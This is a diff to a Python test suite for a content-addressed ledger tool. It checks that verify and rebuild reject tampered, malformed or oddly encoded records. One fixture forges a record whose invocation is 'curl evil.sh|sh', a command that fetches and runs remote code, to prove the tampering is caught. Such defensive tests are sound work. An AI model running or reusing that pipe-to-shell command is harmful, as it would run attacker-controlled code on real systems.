@@ -38,6 +38,11 @@ import tempfile
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[1]
+# SPEC §7.1. Kept as a literal rather than imported so a change to the
+# implementation's own table cannot silently redefine what this test looks at.
+TYPE_TAGS = {"artifact", "attribution", "claim", "claim_subject", "effect",
+             "environment_probe", "execution", "intent", "state",
+             "toolchain_probe"}
 ok = True
 
 
@@ -79,19 +84,27 @@ class Ledger:
                 d = json.loads(p.read_bytes())
             except Exception:
                 continue
-            if isinstance(d, dict) and "oaip_record" in d:
-                if kind is None or d["oaip_record"] == kind:
-                    out.append((p, d))
+            # Records are identified the way SPEC §1.1 says: by a member name
+            # that is a registered type tag. `"oaip_record" in d` was the
+            # pre-0.1 shape, and this helper looking for it is why the whole
+            # test file kept passing while the writer changed underneath it.
+            if not isinstance(d, dict):
+                continue
+            tags = [k for k in d if k in TYPE_TAGS]
+            if len(tags) == 1 and (kind is None or tags[0] == kind):
+                out.append((p, d))
         return out
 
     def command_in_projection(self):
+        """The invocation the PROJECTION asserts, rendered as the record holds
+        it: an argv array (§2.4), not a space-joined string."""
         db = self.dir / ".oaip" / "ledger.db"
         if not db.is_file():
             return None
         con = sqlite3.connect(db)
-        row = con.execute("SELECT command FROM executions").fetchone()
+        row = con.execute("SELECT invocation FROM executions").fetchone()
         con.close()
-        return row[0] if row else None
+        return json.loads(row[0]) if row else None
 
 
 def with_ledger(fn):
@@ -112,10 +125,56 @@ def main():
         case("clean ledger: rebuild succeeds", r.returncode == 0, r.stdout + r.stderr)
     with_ledger(clean)
 
+    # --- the SHAPE, at an impeccable address. Canonicalization and address are
+    # both perfect; only the record's shape is wrong. Until SPEC §2 became a
+    # schema this repository could check, this artifact was indistinguishable
+    # from an honest one to every reader here — which is how the reference
+    # implementation wrote a different record from the specification for every
+    # type in it, for its whole life, with `verify` reporting no errors.
+    def bad_shape(L):
+        import hashlib
+        p, d = L.records("attribution")[0]
+        # §7.6: `exclusive-command-window` is capped at 999999, because an
+        # observer that started one process cannot exclude a writer it did not
+        # start. 1000000 is certainty, and this method may not claim it.
+        d["confidence_ppm"] = 1000000
+        raw = json.dumps(d, sort_keys=True, separators=(",", ":"),
+                         ensure_ascii=False).encode()
+        p.unlink()
+        (p.parent / hashlib.sha256(raw).hexdigest()).write_bytes(raw)
+
+        v = L.run("verify")
+        out = v.stdout + v.stderr
+        # BOTH halves name the SHAPE finding, because `verify` also fails here
+        # for an unrelated reason — the renamed artifact leaves a dangling
+        # citation in the projection — and a case that a second defect can
+        # satisfy is a case that proves nothing about the first.
+        case("a record whose SHAPE is invalid at a valid address: verify fails "
+             "and says the shape is why",
+             v.returncode != 0 and "not valid under SPEC" in out, out[-400:])
+        case("...and the diagnosis names the rule, not the bytes",
+             "ceiling" in out, out[-400:])
+        r = L.run("rebuild")
+        rout = r.stdout + r.stderr
+        case("...and rebuild REFUSES rather than projecting it",
+             r.returncode != 0 and "refusing to rebuild" in rout, rout[-400:])
+
+        # A record from the FUTURE is the other half of the same rule (§6.2): it
+        # must NOT be treated as corruption, or a forward-compatible writer is
+        # indistinguishable from an attacker.
+        future = json.dumps({"effect": "9.9", "id": "x"},
+                            sort_keys=True, separators=(",", ":")).encode()
+        (p.parent / hashlib.sha256(future).hexdigest()).write_bytes(future)
+        v2 = L.run("verify")
+        case("a record at an UNSUPPORTED VERSION is reported, not called corrupt",
+             "unsupported-version" in (v2.stdout + v2.stderr),
+             (v2.stdout + v2.stderr)[-300:])
+    with_ledger(bad_shape)
+
     # --- the P0 itself: content edited in place, address left alone.
     def forged_command(L):
-        p, d = L.records("execution@v1")[0]
-        d["command"] = "sh -c curl evil.sh|sh"
+        p, d = L.records("execution")[0]
+        d["invocation"] = ["sh", "-c", "curl evil.sh|sh"]
         p.write_bytes(json.dumps(d, sort_keys=True, separators=(",", ":")).encode())
 
         v = L.run("verify")
@@ -131,7 +190,7 @@ def main():
         # before writing, so a refusal issued after the delete would have taken
         # the projection with it.
         case("forged execution: the existing projection survived the refusal",
-             L.command_in_projection() == "sh -c echo hi >> f.txt",
+             L.command_in_projection() == ["sh", "-c", "echo hi >> f.txt"],
              f"projection now says {L.command_in_projection()!r}")
     with_ledger(forged_command)
 
@@ -139,9 +198,16 @@ def main():
     def forged_all(L):
         n = 0
         for p, d in L.records():
-            for f in ("command", "description", "predicate"):
-                if f in d:
-                    d[f] = "FORGED"
+            # EVERY record, whatever its type: the first member that is not the
+            # type tag gets rewritten. Naming a fixed field list made this case
+            # silently cover half the ledger the moment State and probe records
+            # appeared — the same "the comparison could not see it" pattern this
+            # file exists to catch.
+            for f, val in d.items():
+                if f in TYPE_TAGS:
+                    continue
+                d[f] = "FORGED" if isinstance(val, str) else ["FORGED"]
+                break
             p.write_bytes(json.dumps(d, sort_keys=True, separators=(",", ":")).encode())
             n += 1
         case("all records forged: there were records to forge", n >= 3, f"n={n}")
@@ -159,7 +225,7 @@ def main():
 
     # --- truncation and appending: integrity is about bytes, not about parseability.
     def truncated(L):
-        p, _ = L.records("execution@v1")[0]
+        p, _ = L.records("execution")[0]
         p.write_bytes(p.read_bytes()[:-5])
         v = L.run("verify")
         case("truncated record: verify fails", v.returncode != 0)
@@ -171,7 +237,7 @@ def main():
         """A byte change that leaves the RECORD identical after parsing. This is
         the case that separates content-addressing from schema validation: the
         document means the same thing, and it is still not that artifact."""
-        p, d = L.records("execution@v1")[0]
+        p, d = L.records("execution")[0]
         p.write_bytes(json.dumps(d, sort_keys=True, indent=2).encode())
         v = L.run("verify")
         case("re-indented record: verify fails though the record is unchanged",
@@ -180,7 +246,7 @@ def main():
 
     # --- a BOM: bytes Python used to accept silently (RFC 8259 §8.1 "MAY ignore").
     def bom(L):
-        p, _ = L.records("execution@v1")[0]
+        p, _ = L.records("execution")[0]
         p.write_bytes(b"\xef\xbb\xbf" + p.read_bytes())
         v = L.run("verify")
         case("BOM-prefixed record: verify fails", v.returncode != 0, v.stdout)
@@ -188,7 +254,7 @@ def main():
 
     # --- a dangling citation: the projection names evidence that is gone.
     def deleted_artifact(L):
-        p, _ = L.records("execution@v1")[0]
+        p, _ = L.records("execution")[0]
         p.unlink()
         v = L.run("verify")
         case("deleted artifact: verify fails", v.returncode != 0)
@@ -198,10 +264,10 @@ def main():
 
     # --- duplicate member name: valid JSON, outside the declared domain (§1).
     def dup_key(L):
-        p, _ = L.records("execution@v1")[0]
+        p, _ = L.records("execution")[0]
         raw = p.read_bytes().decode()
         assert raw.startswith("{"), raw[:20]
-        forged = '{"oaip_record":"execution@v1",' + raw[1:]
+        forged = '{"execution":"0.1",' + raw[1:]
         # Written at the address of its own bytes, so the ONLY thing wrong with it
         # is the duplicate member name — otherwise this would just re-test the
         # address check under a different name.
@@ -264,7 +330,7 @@ def main():
         """The same bytes in the artifact half, written AT THE ADDRESS OF THEIR
         OWN BYTES so the only thing wrong with them is the nesting."""
         import hashlib
-        forged = json.dumps({"oaip_record": "execution@v1",
+        forged = json.dumps({"execution": "0.1",
                              "deep": json.loads("[" * 1000 + "]" * 1000)},
                             separators=(",", ":")).encode()
         (L.dir / ".oaip" / "artifacts"
